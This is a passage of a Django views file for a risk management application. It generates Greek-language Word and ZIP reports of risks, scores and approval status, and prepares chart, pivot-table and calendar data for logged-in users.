            def add_section(section_title, items, color):
                if items.exists():
                    # Section title row, merge the columns
                    section_row = table.add_row().cells
                    section_row[0].merge(section_row[1]).merge(section_row[2])
                    title_run = section_row[0].paragraphs[0].add_run(section_title)
                    title_run.bold = True
                    title_run.font.color.rgb = color

                    # Iterate over items
                    for item in items.all():
                        # Title row for each item
                        item_title_row = table.add_row().cells
                        item_title_row[0].merge(item_title_row[1]).merge(item_title_row[2])
                        item_title_row[0].paragraphs[0].add_run(f'Title: {item.title}').bold = True

                        # Description row for each item
                        item_description_row = table.add_row().cells
                        item_description_row[0].merge(item_description_row[1]).merge(item_description_row[2])
                        item_description_row[0].paragraphs[0].add_run(f'Description: {clean_html_tags(item.description)}')

            # Add each section
            add_section('Mitigations', risk.mitigations, RGBColor(173, 216, 230))  # Light blue
            add_section('Actions', risk.actions, RGBColor(144, 238, 144))  # Light green
            add_section('Indicators (KPIs/KRIs)', risk.indicators, RGBColor(255, 255, 224))  # Light orange
            add_section('Events', risk.events, RGBColor(255, 218, 185))  # Light peach
            add_section('Procedures', risk.procedures, RGBColor(211, 211, 211))  # Light grey

            # Handle risk comments and mitigations
            add_risk_comments_gr(document, risk)

            document.add_page_break()


def generate_category_chart(portfolio):
    # Generate a bar chart for the number of risks per category within the portfolio
    categories = (
        Category.objects.filter(risk__portfolio=portfolio)
        .values('name')
        .annotate(total=Count('risk'))
        .order_by('name')
    )
    labels = [c['name'] for c in categories]
    values = [c['total'] for c in categories]
    
    # Assuming there's a function generate_bar_chart that returns a Base64-encoded image string
    return generate_bar_chart(labels, values, f'Αριθμός Κινδύνων ανά Κατηγορία για το {portfolio.name}')   

# Function to add comments after each risk based on the mitigation performance
from docx import Document

# def add_risk_comments_gr(document, risk):
#     inherent_score = risk.inherent_score()
#     residual_score = risk.residual_score()
#     targeted_score = risk.targeted_score()

#     comment_paragraph = document.add_paragraph()
#     comment_paragraph.add_run("Σχόλια: ").bold = True

#     # Σύγκριση των βαθμολογιών και δημιουργία σχολίων
#     if residual_score < inherent_score:
#         comment_paragraph.add_run(
#             f'Η μετρίαση ήταν αποτελεσματική καθώς η υπολειπόμενη βαθμολογία ({residual_score}) είναι χαμηλότερη από την εγγενή βαθμολογία ({inherent_score}). '
#         )
#     else:
#         comment_paragraph.add_run(
#             f'Η μετρίαση δεν ήταν αποτελεσματική καθώς η υπολειπόμενη βαθμολογία ({residual_score}) είναι παρόμοια με την εγγενή βαθμολογία ({inherent_score}). '
#         )

#     if targeted_score < residual_score:
#         comment_paragraph.add_run(
#             f'Ωστόσο, απαιτούνται επιπλέον ενέργειες για την επίτευξη της στοχευμένης βαθμολογίας ({targeted_score}).'
#         )
#     elif targeted_score == residual_score:
#         comment_paragraph.add_run(
#             f'Δεν σχεδιάζονται επιπλέον ενέργειες, καθώς η υπολειπόμενη βαθμολογία ταυτίζεται με τη στοχευμένη βαθμολογία ({targeted_score}).'
#         )
#     else:
#         warning_run = comment_paragraph.add_run(
#             f'Η στοχευμένη βαθμολογία ({targeted_score}) είναι χαμηλότερη από την υπολειπόμενη βαθμολογία, αλλά δεν έχουν ληφθεί μέτρα. '
#             'Προειδοποίηση: Οι στοχευμένες βαθμολογίες δεν μπορούν να μειωθούν χωρίς επιπλέον ενέργειες.'
#         )
#         warning_run.italic = True  # Το κείμενο θα είναι πλάγιο


#     document.add_page_break()




from django.http import HttpResponse
from django.shortcuts import render
from .models import Risk  # Import your Risk model
from docx import Document
import io

from docx.enum.text import WD_ALIGN_PARAGRAPH

# Function to apply justification to paragraphs
def justify_paragraph_gr(paragraph):
    paragraph.alignment = WD_ALIGN_PARAGRAPH.JUSTIFY

# Function to justify all paragraphs and table contents
def justify_all_content_gr(document):
    # Justify all paragraphs in the main document except for headings
    for paragraph in document.paragraphs:
        # Check if the paragraph is not a heading
        if not paragraph.style.name.startswith('Heading'):
            paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.JUSTIFY
  
from django.db.models import F, ExpressionWrapper, IntegerField
import re

# Function to clean HTML tags from TinyMCE content
def clean_html_tags(text):
    return re.sub(r'<.*?>', '', text)  # Simple regex to remove HTML tags

# Function to add a detailed analysis of the top 5 risks by inherent score



from bs4 import BeautifulSoup
def add_html_to_paragraph_gr(paragraph, html_content):
    """
    Converts HTML content into a styled Word paragraph, retaining formatting
    from TinyMCE (bold, italics, lists, paragraphs).
    """
    soup = BeautifulSoup(html_content, 'html.parser')

    def add_run_with_break(paragraph, text, bold=False, italic=False, underline=False):
        """
        Helper function to add a run with specified formatting and a line break.
        """
        run = paragraph.add_run(text)
        run.bold = bold
        run.italic = italic
        run.underline = underline
        run.add_break()

    def process_element(element, parent_paragraph):
        """
        Recursively processes an HTML element and applies the formatting
        to the given Word paragraph.
        """
        if element.name is None:
            # Plain text node
            text = element.strip()
            if text:
                parent_paragraph.add_run(text)

        elif element.name in ['b', 'strong']:
            # Bold text
            run = parent_paragraph.add_run(element.get_text(strip=True))
            run.bold = True

        elif element.name in ['i', 'em']:
            # Italic text
            run = parent_paragraph.add_run(element.get_text(strip=True))
            run.italic = True

        elif element.name == 'u':
            # Underlined text
            run = parent_paragraph.add_run(element.get_text(strip=True))
            run.underline = True

        elif element.name == 'br':
            # Line break
            parent_paragraph.add_run().add_break()

        elif element.name == 'p':
            # Create a new run for the paragraph text.
            text = element.get_text(strip=True)
            if text:
                parent_paragraph.add_run(text)
            # Add a new break for the paragraph.
            parent_paragraph.add_run().add_break()

        elif element.name == 'ul':
            # Handle unordered lists
            for li in element.find_all('li', recursive=False):
                add_run_with_break(parent_paragraph, f'• {li.get_text(strip=True)}')

        elif element.name == 'ol':
            # Handle ordered lists
            for i, li in enumerate(element.find_all('li', recursive=False), 1):
                add_run_with_break(parent_paragraph, f'{i}. {li.get_text(strip=True)}')

        elif element.name == 'span':
            # Process spans based on styles if present
            style = element.get('style', '')
            run = parent_paragraph.add_run(element.get_text(strip=True))
            if 'font-weight: bold' in style or 'arial black' in style.lower():
                run.bold = True

        else:
            # For any other tags, process their children recursively
            for child in element.contents:
                process_element(child, parent_paragraph)

    # Start processing from the root of the parsed HTML
    process_element(soup, paragraph)

    return paragraph



from docx.shared import RGBColor, Inches

def add_summary_section_sorted_by_residual_score(document):
    """
    Adds a summary section with a pivot table grouped by Portfolio and Risk Title,
    sorted by residual score. The Category is included as a column.
    """
    # Add a section title for the summary
    document.add_heading('\nΣυνοπτική Απεικόνιση Κινδύνων', level=1)
    document.add_paragraph(
        '\nΗ παρούσα ενότητα της αναφοράς παρέχει μια συνοπτική απεικόνιση των κινδύνων που έχουν αναγνωριστεί ανά χαρτοφυλάκιο. '
        'Εστιάζει μόνο στους τίτλους των κινδύνων και τις βαθμολογίες τους, παρουσιάζοντας τους κινδύνους κατά φθίνουσα σειρά '
        'υπολειπόμενης βαθμολογίας. Για περισσότερες λεπτομέρειες, παρακαλούμε ανατρέξτε στο Παράρτημα 1.'
    )

    # Retrieve all portfolios
    portfolios = Portfolio.objects.exclude(
        name__icontains='archive'
    ).exclude(
        name__icontains='sub'
    ).exclude(
        name__icontains='set'
    ).order_by('name')


    for portfolio in portfolios:
        # Add a heading for each portfolio
        document.add_heading(f'Χαρτοφυλάκιο: {portfolio.name}', level=2)

        # Retrieve risks associated with the current portfolio, sorted by residual score
        risks = Risk.objects.filter(portfolio=portfolio).annotate(
            residual_score=ExpressionWrapper(
                F('residual_likelihood') * F('residual_impact'),
                output_field=IntegerField()
            )
        ).order_by('-residual_score')

        # Create the table for all risks in this portfolio
        table = document.add_table(rows=1, cols=6)  # Added an extra column for Category
        table.style = 'Table Grid'
        set_summary_table_headers_with_category(table)

        # Adjust column widths to ensure uniformity
        set_summary_column_widths_with_category(table)

        # Add a row for each risk
        for risk in risks:
            row = table.add_row().cells
            add_summary_risk_row_with_category(row, risk)

    return document

def set_summary_table_headers_with_category(table):
    """Set table headers with a light blue background, including a category column."""
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Κίνδυνος (Risk)'
    hdr_cells[1].text = 'Εγγενής (Inherent Score)'
    hdr_cells[2].text = 'Υπολειπόμενη (Residual Score)'
    hdr_cells[3].text = 'Στοχευμένη (Targeted Score)'
    hdr_cells[4].text = 'Κατηγορία (Category)'
    hdr_cells[5].text = 'Ρόλοι Ιδιοκτητών (Owner Roles)'
    for cell in hdr_cells:
        set_cell_background_color(cell, 'D0E0E3')  # Light blue background
        for paragraph in cell.paragraphs:
            paragraph.alignment = 1  # Center-align the text

def set_summary_column_widths_with_category(table):
    """Set the column widths to ensure uniformity in the summary section with category."""
    for row in table.rows:
        row.cells[0].width = Inches(2.5)  # Risk Title
        row.cells[1].width = Inches(1.5)  # Inherent Score
        row.cells[2].width = Inches(1.5)  # Residual Score
        row.cells[3].width = Inches(1.5)  # Targeted Score
        row.cells[4].width = Inches(1.5)  # Category
        row.cells[5].width = Inches(1.5)  # Owner Roles

def add_summary_risk_row_with_category(row, risk):
    """
    Helper function to populate a row in the summary table with risk details and category.
    """
    # Risk Title in the first cell
    row[0].text = risk.title

    # Inherent Score with color
    inherent_score_value = risk.inherent_score() if callable(risk.inherent_score) else risk.inherent_score
    inherent_run = row[1].paragraphs[0].add_run(
        f'{risk.inherent_likelihood} x {risk.inherent_impact} = {inherent_score_value}'
    )
    color_inherent_score(inherent_run, inherent_score_value)

    # Residual Score with color
    residual_score_value = risk.residual_score() if callable(risk.residual_score) else risk.residual_score
    residual_run = row[2].paragraphs[0].add_run(
        f'{risk.residual_likelihood} x {risk.residual_impact} = {residual_score_value}'
    )
    color_residual_score(residual_run, residual_score_value)

    # Targeted Score with color
    targeted_score_value = risk.targeted_score() if callable(risk.targeted_score) else risk.targeted_score
    targeted_run = row[3].paragraphs[0].add_run(
        f'{risk.targeted_likelihood} x {risk.targeted_impact} = {targeted_score_value}'
    )
    color_targeted_score(targeted_run, targeted_score_value)

    # Add the Category
    row[4].text = risk.category.name

    # Add the Owner Roles, sorted alphabetically
    roles = ', '.join(sorted(
        {owner.role for owner in risk.owners.all()},
        key=lambda role: role.lower()
    ))
    row[5].text = roles

def color_inherent_score(run, score):
    """Helper function to color the inherent score text based on severity."""
    if score <= 6:
        run.font.color.rgb = RGBColor(0, 128, 0)  # Green for low risk
    elif 7 <= score <= 12:
        run.font.color.rgb = RGBColor(255, 204, 0)  # orange for medium risk
    elif score >= 13:
        run.font.color.rgb = RGBColor(255, 0, 0)  # Red for high risk

def color_residual_score(run, score):
    """Helper function to color the residual score text based on severity."""
    if score <= 6:
        run.font.color.rgb = RGBColor(0, 128, 0)  # Green for low risk
    elif 7 <= score <= 12:
        run.font.color.rgb = RGBColor(255, 204, 0)  # orange for medium risk
    elif score >= 13:
        run.font.color.rgb = RGBColor(255, 0, 0)  # Red for high risk

def color_targeted_score(run, score):
    """Helper function to color the targeted score text based on severity."""
    if score <= 6:
        run.font.color.rgb = RGBColor(0, 128, 0)  # Green for low risk
    elif 7 <= score <= 12:
        run.font.color.rgb = RGBColor(255, 204, 0)  # orange for medium risk
    elif score >= 13:
        run.font.color.rgb = RGBColor(255, 0, 0)  # Red for high risk

from docx import Document

from datetime import datetime, timedelta
from docx.shared import RGBColor

from django.utils import timezone
from datetime import timedelta
from docx.shared import RGBColor
from docx.oxml.ns import nsdecls
from docx.oxml import parse_xml




from docx import Document
from docx.shared import Pt
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT

def add_risk_management_process_section(document):
    document.add_heading('Διαδικασία Διαχείρισης Κινδύνου (Risk Management Process)', level=2)
    
    # Intro paragraph
    intro_paragraph = document.add_paragraph(
        "Η πλατφόρμα ermapp.avax.gr υποστηρίζει την παρακάτω διαδικασία διαχείρισης κινδύνου, "
        "παρέχοντας μια δομημένη προσέγγιση για την ταυτοποίηση, μείωση και παρακολούθηση κινδύνων."
    )
    intro_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.JUSTIFY

    # Define the steps with descriptions, in Greek with English notation
    steps = [
        ("Βήμα 1: Ταυτοποίηση (Step 1: Identification)", "Ταυτοποίηση κινδύνων και ανάθεση ευθυνών."),
        ("Βήμα 2: Μετριασμοί (Step 2: Mitigations)", "Εφαρμογή στρατηγικών για τη μείωση της επίδρασης και πιθανότητας των κινδύνων."),
        ("Βήμα 3: Δράσεις (Step 3: Actions)", "Λήψη δράσεων για διαχείριση και μείωση των κινδύνων."),
        ("Βήμα 4: Δείκτες (Step 4: Indicators)", "Ορισμός και παρακολούθηση δεικτών για συνεχή παρακολούθηση κινδύνων."),
        ("Βήμα 5: Συμβάντα (Step 5: Events)", "Καταγραφή και διαχείριση γεγονότων που σχετίζονται με κινδύνους."),
        ("Βήμα 6: Ευκαιρίες (Step 6: Opportunities)", "Αξιοποίηση ευκαιριών για βελτίωση της διαχείρισης κινδύνου."),
        ("Βήμα 7: Εγκρίσεις (Step 7: Approvals)", "Τακτικές αναθεωρήσεις και εγκρίσεις για αποτελεσματικό έλεγχο κινδύνων.")
    ]

    # Adding each step title and description
    for step_title, step_desc in steps:
        # Step Title
        title_paragraph = document.add_paragraph(step_title)
        title_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
        title_run = title_paragraph.runs[0]
        title_run.bold = True
        title_run.font.size = Pt(12)

        # Step Description
        desc_paragraph = document.add_paragraph(step_desc)
        desc_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
        desc_paragraph.paragraph_format.space_after = Pt(10)





    # Adding Approval and Assessment status tables
    document.add_heading('Approval Status Table', level=2)
    add_status_table(document, 'approval')

    document.add_heading('Assessment Status Table', level=2)
    add_status_table(document, 'assessment')



from django.utils import timezone
from datetime import timedelta
from docx.oxml.ns import nsdecls
from docx.oxml import parse_xml

def add_status_table(document, status_type):
    """
    Adds a status table to the document for either approval or assessment.
    """
    # Define time threshold for flagging (6 months)
    threshold_date = timezone.now() - timedelta(days=180)

    # Prepare the data for the table based on the status type
    from django.db.models import Q

    if status_type == 'approval':
        header = ['Κατάσταση Έγκρισης', 'Αριθμός Κινδύνων']
        risks_green = Risk.objects.exclude(
            Q(portfolio__name__icontains='archive') | 
            Q(portfolio__name__icontains='sub') | 
            Q(portfolio__name__icontains='set')
        ).filter(last_approval_date__gte=threshold_date).count()
        
        risks_red = Risk.objects.exclude(
            Q(portfolio__name__icontains='archive') | 
            Q(portfolio__name__icontains='sub') | 
            Q(portfolio__name__icontains='set')
        ).filter(last_approval_date__lt=threshold_date).count() + \
            Risk.objects.exclude(
                Q(portfolio__name__icontains='archive') | 
                Q(portfolio__name__icontains='sub') | 
                Q(portfolio__name__icontains='set')
            ).filter(last_approval_date__isnull=True).count()

    elif status_type == 'assessment':
        header = ['Κατάσταση Αξιολόγησης', 'Αριθμός Κινδύνων']
        risks_green = Risk.objects.exclude(
            Q(portfolio__name__icontains='archive') | 
            Q(portfolio__name__icontains='sub') | 
            Q(portfolio__name__icontains='set')
        ).filter(last_assessed_date__gte=threshold_date).count()
        
        risks_red = Risk.objects.exclude(
            Q(portfolio__name__icontains='archive') | 
            Q(portfolio__name__icontains='sub') | 
            Q(portfolio__name__icontains='set')
        ).filter(last_assessed_date__lt=threshold_date).count() + \
            Risk.objects.exclude(
                Q(portfolio__name__icontains='archive') | 
                Q(portfolio__name__icontains='sub') | 
                Q(portfolio__name__icontains='set')
            ).filter(last_assessed_date__isnull=True).count()


    # Create the table
    table = document.add_table(rows=1, cols=2)
    table.style = 'Table Grid'

    # Add header row
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = header[0]
    hdr_cells[1].text = header[1]

    # Add a row for green (within the last 6 months)
    row_cells = table.add_row().cells
    row_cells[0].text = 'Εντός Προθεσμίας (Πράσινο)'
    row_cells[1].text = str(risks_green)
    set_cell_color(row_cells[0], '00B050')  # Green

    # Add a row for red (older than 6 months or empty)
    row_cells = table.add_row().cells
    row_cells[0].text = 'Εκτός Προθεσμίας ή Χωρίς Ημερομηνία (Κόκκινο)'
    row_cells[1].text = str(risks_red)
    set_cell_color(row_cells[0], 'FF0000')  # Red

def set_cell_color(cell, color):
    """
    Sets the background color of a given table cell.
    """
    cell._element.get_or_add_tcPr().append(
        parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}"/>')
    )

def set_cell_color(cell, color):
    """
    Sets the background color of a given table cell.
    """
    cell._element.get_or_add_tcPr().append(
        parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}"/>')
    )



@permission_required('orm.can_view_reports', raise_exception=True)
def generate_annual_report_gr(request):
    # Reference to the logo path in the static folder
    logo_path = finders.find('images/avax-logo.jpeg')

    if not logo_path:
        raise FileNotFoundError('Logo file not found in static/images.')

    # Create a buffer to hold the ZIP data
    buffer = BytesIO()

    with zipfile.ZipFile(buffer, 'w') as zip_archive:
        # Create the main report document
        main_report = Document()
        set_calibri_font(main_report)
        add_company_logo_gr(main_report, logo_path)
        add_cover_page_gr(main_report)
        add_table_of_contents_gr(main_report)
        add_executive_summary_gr(main_report)
        # add_summary_section_sorted_by_residual_score(main_report)
        add_executive_risk_severity_list(main_report)
        add_page_numbers_gr(main_report)

        # Save the main report in memory
        main_report_io = BytesIO()
        main_report.save(main_report_io)
        main_report_io.seek(0)

        # Add the main report to the zip file
        zip_archive.writestr(f'annual_risk_report_GREEK.docx', main_report_io.read())
        portfolios= Portfolio.objects.exclude(
        Q(name__icontains='archive') | Q(name__icontains='sub') | Q(name__icontains='set')

    ).order_by('name')
        selected_portfolios= sorted(
                [
                    portfolio for portfolio in portfolios
                    if not any(keyword in portfolio.name.lower() for keyword in ['archive', 'sub', 'set'])
                ],
                key=lambda portfolio: portfolio.name.lower()
        )
        # Create the annex document
        annex_report = Document()
        set_calibri_font(annex_report)
        add_company_logo_gr(annex_report, logo_path)
        annex_report.add_heading('Annex 1: Risks by Portfolio', level=1)
        add_residual_risk_pivot_section_perportfolio(annex_report,selected_portfolios)
        add_page_numbers_gr(annex_report)

        # Save the annex in memory
        annex_report_io = BytesIO()
        annex_report.save(annex_report_io)
        annex_report_io.seek(0)

        # Add the annex to the zip file
        zip_archive.writestr(f'annex1_risks_by_portfolio_GREEK.docx', annex_report_io.read())

    # Set the buffer position to the beginning
    buffer.seek(0)

    # Create the response
    response = HttpResponse(buffer, content_type='application/zip')
    response['Content-Disposition'] = f'attachment; filename="annual_report_GREEK.zip"'

    return response



@login_required
def risk_pivot_view(request):
    try:
        # Fetch the user's profile
        user_profile = UserProfile.objects.get(user=request.user)
        associated_portfolios = user_profile.portfolios.all()

        # Fetch risks only for the associated portfolios
        risks = Risk.objects.filter(portfolio__in=associated_portfolios)

        # Prepare hierarchical data for the pivot table
        pivot_data = {}
        for risk in risks:
            portfolio_name = risk.portfolio.name if risk.portfolio else "N/A"
            category_name = risk.category.name if risk.category else "N/A"

            # Ensure risk and mitigation links include /admin prefix
            risk_link = f'/risk/{risk.id}'
            mitigations_links = [
                {'title': mitigation.title, 'link': f'/admin/orm/mitigation/{mitigation.id}/change/'}
                for mitigation in risk.mitigations.all()
            ]

            if portfolio_name not in pivot_data:
                pivot_data[portfolio_name] = {}

            if category_name not in pivot_data[portfolio_name]:
                pivot_data[portfolio_name][category_name] = []

            pivot_data[portfolio_name][category_name].append({
                'id': risk.id,
                'title': risk.title,
                'risk_link': risk_link,
                'inherent_score': risk.inherent_score(),
                'residual_score': risk.residual_score(),
                'targeted_score': risk.targeted_score(),
                'mitigations': mitigations_links,
                'owners': ", ".join([owner.user.username for owner in risk.owners.all()]),
            })

        # Debugging: Verify structure
        # print("Pivot Data:", pivot_data)

        # Prepare bar chart data (if needed)
        chart_data = {}
        for risk in risks:
            portfolio_name = risk.portfolio.name if risk.portfolio else "N/A"
            category_name = risk.category.name if risk.category else "N/A"
            residual_score = risk.residual_score()

            # Categorize by risk level
            if residual_score <= 6:
                risk_level = "low"
            elif residual_score <= 12:
                risk_level = "medium"
            else:
                risk_level = "high"

            if portfolio_name not in chart_data:
                chart_data[portfolio_name] = {'low': 0, 'medium': 0, 'high': 0}

            chart_data[portfolio_name][risk_level] += 1

        # Debugging: Verify chart data
        # print("Chart Data:", chart_data)

        context = {
            "pivot_data": pivot_data,
            "chart_data": chart_data,
        }
        return render(request, "risk_pivot_table.html", context)

    except UserProfile.DoesNotExist:
        # Handle case where the user does not have a profile
        return render(request, "error.html", {"message": "User profile not found."})



from django.shortcuts import render
from orm.models import Risk, UserProfile
from django.contrib.auth.decorators import login_required
from django.core.exceptions import ObjectDoesNotExist

from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from .models import Risk, UserProfile
from django.core.exceptions import ObjectDoesNotExist

@login_required
def risk_chart_view(request):
    if request.user.is_superuser:
        
        risks = Risk.objects.all()
    else:
        try:
            user_profile = UserProfile.objects.get(user=request.user)
            associated_portfolios = user_profile.portfolios.all()
            risks = Risk.objects.filter(portfolio__in=associated_portfolios)
        except ObjectDoesNotExist:
            risks = Risk.objects.none()

    chart_data = {}
    for risk in risks:
        portfolio = risk.portfolio.name if risk.portfolio else "Uncategorized"
        category = risk.category.name if risk.category else "Uncategorized"

        # Calculate risk levels
        residual_score = risk.residual_likelihood * risk.residual_impact
        if residual_score <= 6:
            level = 'low'
        elif residual_score <= 12:
            level = 'medium'
        else:
            level = 'high'

        if portfolio not in chart_data:
            chart_data[portfolio] = {
                'low': {'count': 0, 'risks': []},
                'medium': {'count': 0, 'risks': []},
                'high': {'count': 0, 'risks': []},
                'categories': {}
            }

        if category not in chart_data[portfolio]['categories']:
            chart_data[portfolio]['categories'][category] = {
                'low': {'count': 0, 'risks': []},
                'medium': {'count': 0, 'risks': []},
                'high': {'count': 0, 'risks': []},
            }

        # Increment portfolio-level counts
        chart_data[portfolio][level]['count'] += 1

        # Increment category-level counts
        chart_data[portfolio]['categories'][category][level]['count'] += 1

        risk_data = {
            'title': risk.title,
            'id': risk.id,
            'inherent': risk.inherent_likelihood * risk.inherent_impact,
            'residual': risk.residual_likelihood * risk.residual_impact,
            'targeted': risk.targeted_likelihood * risk.targeted_impact,
        }

        chart_data[portfolio]['categories'][category][level]['risks'].append(risk_data)
        chart_data[portfolio][level]['risks'].append(risk_data)

    context = {'chart_data': chart_data}
    return render(request, 'risk_chart.html', context)



from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from orm.models import Risk, UserProfile
from django.core.exceptions import ObjectDoesNotExist



from django.shortcuts import render
from orm.models import Risk, UserProfile
from django.contrib.auth.decorators import login_required
from django.core.exceptions import ObjectDoesNotExist

@login_required
def risk_chart_view_portfolio(request):
    if request.user.is_superuser:
        risks = Risk.objects.all()
    else:
        # Fetch the user's profile
        try:
            user_profile = UserProfile.objects.get(user=request.user)
            associated_portfolios = user_profile.portfolios.all()

            # Fetch risks only for the associated portfolios
            risks = Risk.objects.filter(portfolio__in=associated_portfolios)
        except ObjectDoesNotExist:
            # Handle the case where UserProfile does not exist
            risks = Risk.objects.none()  # Empty queryset

    chart_data = {}
    for risk in risks:
        if not risk.portfolio:  # Skip if portfolio is None
            continue

        portfolio = risk.portfolio.name
        # Calculate risk level based on residual likelihood and impact
        risk_score = risk.residual_likelihood * risk.residual_impact
        if risk_score <= 6:
            level = 'low'
        elif risk_score <= 12:
            level = 'medium'
        else:
            level = 'high'

        if portfolio not in chart_data:
            chart_data[portfolio] = {
                'low': {'count': 0, 'risks': []},
                'medium': {'count': 0, 'risks': []},
                'high': {'count': 0, 'risks': []},
            }

        chart_data[portfolio][level]['count'] += 1
        chart_data[portfolio][level]['risks'].append({
            'title': risk.title,
            'change_url': f'/risk/{risk.id}/',
        })

    context = {'chart_data': chart_data}
    return render(request,'chart_porfolio.html', context)

# =============================================================================

from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from orm.models import Risk, UserProfile
from django.core.exceptions import ObjectDoesNotExist

@login_required
def risk_apetite_view(request):
    risks = Risk.objects.all()  # No filters applied

    chart_data = {}
    for risk in risks:
        if not risk.portfolio:
            continue

        portfolio = risk.portfolio.name
        category = risk.category.name if risk.category else "Uncategorized"

        risk_score = risk.residual_likelihood * risk.residual_impact
        level = 'low' if risk_score <= 6 else 'medium' if risk_score <= 12 else 'high'

        if portfolio not in chart_data:
            chart_data[portfolio] = {
                'low': {'count': 0, 'risks': []},
                'medium': {'count': 0, 'risks': []},
                'high': {'count': 0, 'risks': []},
                'categories': {},
                'total_count': 0
            }

        if category not in chart_data[portfolio]['categories']:
            chart_data[portfolio]['categories'][category] = {
                'low': {'count': 0, 'risks': []},
                'medium': {'count': 0, 'risks': []},
                'high': {'count': 0, 'risks': []},
            }

        risk_data = {
            'title': risk.title,
            'id': risk.id,
            'inherent': risk.inherent_likelihood * risk.inherent_impact,
            'residual': risk.residual_likelihood * risk.residual_impact,
            'targeted': risk.targeted_likelihood * risk.targeted_impact,
        }

        chart_data[portfolio][level]['count'] += 1
        chart_data[portfolio]['categories'][category][level]['count'] += 1
        chart_data[portfolio]['total_count'] += 1

        chart_data[portfolio][level]['risks'].append(risk_data)
        chart_data[portfolio]['categories'][category][level]['risks'].append(risk_data)

    context = {'chart_data': chart_data}
    return render(request, 'risk_apetite.html', context)






# =============================================================================
from django.shortcuts import render
from .models import Risk  # Adjust the import based on your app's structure

from django.shortcuts import render
from .models import Risk, Portfolio
from django.contrib.auth.decorators import login_required

from django.shortcuts import render
from .models import Risk, Portfolio
from django.contrib.auth.decorators import login_required

@login_required
def calendar_view(request):
    """Renders the calendar with assessment and approval dates, including uncategorized risks and filtered by the user's portfolios."""
    # Get the logged-in user's profile
    user_profile = request.user.userprofile  # Assuming a OneToOneField to the User model in UserProfile

    # Filter portfolios associated with the user's profile, excluding those starting with "archive"
    portfolios = Portfolio.objects.filter(user_profiles=user_profile).exclude(name__istartswith="archive")

    # Fetch risks associated with the user's portfolios
    risks_in_portfolios = Risk.objects.filter(portfolio__in=portfolios)

    # Fetch risks without any portfolio (uncategorized risks)
    uncategorized_risks = Risk.objects.filter(portfolio__isnull=True)

    # Combine both categorized and uncategorized risks
    risks = risks_in_portfolios.union(uncategorized_risks)

    # Pass the filtered risks to the context
    context = {
        'risks': risks,
        'portfolios': portfolios,
    }

    return render(request, 'calendar_view.html', context)

from django.utils import timezone
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
from orm.models import Risk, ApprovalRequest

from django.utils import timezone
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
from orm.models import Risk, ApprovalRequest

from django.utils import timezone
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
from orm.models import Risk, ApprovalRequest

from django.utils import timezone
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
from orm.models import Risk, ApprovalRequest, Action

from django.utils import timezone
from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
from orm.models import Risk, ApprovalRequest, Action
from django.http import JsonResponse
from django.utils import timezone
from .models import UserProfile, Risk, Action, ApprovalRequest  # Adjust imports as needed
from django.http import JsonResponse
from django.utils import timezone
from .models import UserProfile, Risk, Action, ApprovalRequest  # Adjust imports as needed

from django.http import JsonResponse
from django.utils import timezone
from .models import UserProfile, Risk, Action, ApprovalRequest  # Adjust imports as needed

from django.http import JsonResponse
from django.utils import timezone
from .models import UserProfile, Risk, Action, ApprovalRequest  # Adjust imports as needed

def get_calendar_events(request):
    """Fetches calendar events for risk assessments, approvals, user-specific approvals, and actions."""
    today = timezone.now().date()
    user_profile = UserProfile.objects.get(user=request.user)
    
    # Fetch risks and actions related to the user
    risks = Risk.objects.filter(portfolio__user_profiles=user_profile)

    # Filter actions for owner and performer where status is 'pending'
    actions_owner = Action.objects.filter(owner=user_profile, status='pending')
    actions_performer = Action.objects.filter(performer=user_profile, status='pending')

    events = []

    # Risk-related events (assessments and approvals)
    for risk in risks:
        # Assessment Event
        if not risk.last_assessed_date:
            events.append({
                'title': f'Pending Assessment: {risk.title}',
                'start': today.isoformat(),
                'color': '#007BFF',  # Blue for assessments
                'type': 'assessment',
                'url': f'/risk/{risk.id}/',
                'allDay': True
            })
        elif risk.next_assessment_date:  # Check if not None
            events.append({
                'title': f'Assessment: {risk.title}',
                'start': risk.next_assessment_date.isoformat(),
                'color': '#007BFF',
                'type': 'assessment',
                'url': f'/risk/{risk.id}/'
            })

        # Approval Event
        if not risk.last_approval_date:
            events.append({
                'title': f'Pending Approval: {risk.title}',
                'start': today.isoformat(),
                'color': '#28A745',  # Green for approvals
                'type': 'approval',
                'url': f'/risk/{risk.id}/',
                'allDay': True
            })
        elif risk.next_approval_date:  # Check if not None, corrected from next_assessment_date
            events.append({
                'title': f'Approval: {risk.title}',
                'start': risk.next_approval_date.isoformat(),
                'color': '#28A745',
                'type': 'approval',
                'url': f'/risk/{risk.id}/'
            })

        # User-specific approval event: Plot based on the due_date
        pending_approvals = ApprovalRequest.objects.filter(
            risk=risk, user=user_profile, status='pending'
        )

        for approval in pending_approvals:
            # Handle inherent scores
            inherent_likelihood = (risk.inherent_likelihood() if callable(risk.inherent_likelihood) 
                                 else risk.inherent_likelihood)
            inherent_impact = (risk.inherent_impact() if callable(risk.inherent_impact) 
                             else risk.inherent_impact)
            
            # Handle residual scores
            residual_likelihood = (risk.residual_likelihood() if hasattr(risk, 'residual_likelihood') and callable(risk.residual_likelihood) 
                                 else getattr(risk, 'residual_likelihood', None))
            residual_impact = (risk.residual_impact() if hasattr(risk, 'residual_impact') and callable(risk.residual_impact) 
                             else getattr(risk, 'residual_impact', None))
            
            # Handle targeted scores
            targeted_likelihood = (risk.targeted_likelihood() if hasattr(risk, 'targeted_likelihood') and callable(risk.targeted_likelihood) 
                                 else getattr(risk, 'targeted_likelihood', None))
            targeted_impact = (risk.targeted_impact() if hasattr(risk, 'targeted_impact') and callable(risk.targeted_impact) 
                             else getattr(risk, 'targeted_impact', None))
            
            # Handle approval scores
